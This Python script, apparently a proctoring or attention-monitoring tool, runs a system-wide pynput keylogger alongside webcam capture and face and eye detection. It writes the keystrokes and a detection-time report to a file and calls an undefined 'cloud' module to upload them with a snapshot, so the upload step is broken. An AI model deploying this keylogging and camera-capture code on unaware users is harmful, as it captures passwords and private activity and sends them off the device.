import cv2
from pynput.keyboard import Key, Listener
import logging
from threading import Thread
import time
import timeit



#Defining first function for keystroke detection
def firstFunction():
    while(1):   
        
        log_dir = r"location to save to"
        logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
        
        def on_press(key):
            logging.info(str(key))
        with Listener(on_press=on_press) as listener:
            listener.join()



       
#Defining second function for eye and face detection        
def secondFunction():
    
    #The cascade classifiers are the trained.xml files for detecting the face and eyes.
    face_cascade = cv2.CascadeClassifier('haarcascade_frontalface_default.xml')
    eye_cascade = cv2.CascadeClassifier('haarcascade_eye.xml')
    time_counter=0
    
    #starting timer to calculate total time.
    start = timeit.default_timer()

    
    cap = cv2.VideoCapture(0)
    cap1 = cv2.VideoCapture(0)
    
    #Code to take camerashot.
    return_value, image = cap1.read()
    cv2.imwrite('img'+'.png', image)
    del(cap1)
    
    while 1:
        ret, img = cap.read()
        
        #Converting into gray color
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        
        #detectMultiScale (InputArray image, std::vector< Rect > &objects, double scaleFactor=1.1, int minNeighbors=3, int flags=0, Size minSize=Size(), Size maxSize=Size())
        faces = face_cascade.detectMultiScale(gray, 1.3, 5)

        
#Here, we're finding faces, their sizes, drawing rectangles,
#and noting the ROI. Next, we poke around for some eyes
        
        for (x,y,w,h) in faces:
            
            #Syntax: cv2.rectangle(image, start_point, end_point, color, thickness)
            cv2.rectangle(img,(x,y),(x+w,y+h),(255,0,0),2)
            time_counter=time_counter+1
            roi_gray = gray[y:y+h, x:x+w]
            roi_color = img[y:y+h, x:x+w]
            
#If we find those, we'll go ahead and make some more rectangles. Next we finish up:
            
            eyes = eye_cascade.detectMultiScale(roi_gray)
            for (ex,ey,ew,eh) in eyes:
                cv2.rectangle(roi_color,(ex,ey),(ex+ew,ey+eh),(0,255,0),2)
                cv2.putText(img,'Detected',(x-10, y-10), cv2.FONT_HERSHEY_PLAIN, 1, (0, 255, 0))
                
        cv2.imshow('img',img)
        time.sleep(1)

        #End all process when "ESC" key is pressed
        k = cv2.waitKey(30) & 0xff
        if k == 27:
            stop = timeit.default_timer()
            
            #calculating the time not detecting eyes and face. 
            ti=int(stop - start)
            count1=ti-time_counter-2
            
            f = open("keyLog.txt", "a")
            tii=str(ti)
            count11=str(count1)
            
            #Appending data from eye and face detection to keylog file.
            f.write("\n")
            f.write("____FACE AND EYE DETECTION REPORT____")
            f.write("\nTotal time: ")
            f.write(tii)
            f.write("sec")
            f.write("\nTime Not Detected: ")
            f.write(count11)
            f.write("sec\n")
            f.write("\n")
            f.close()
            
            #Uploading the camerashot, keystroke data and face detection data on cloud.
            cloud.UploadPhotoToCloud()
            cloud.UploadTextToCloud()
            exit()
            break

    
       
t1 = Thread(target = firstFunction)
t2 = Thread(target = secondFunction)

t1.start()
t2.start()

cv2.destroyAllWindows()
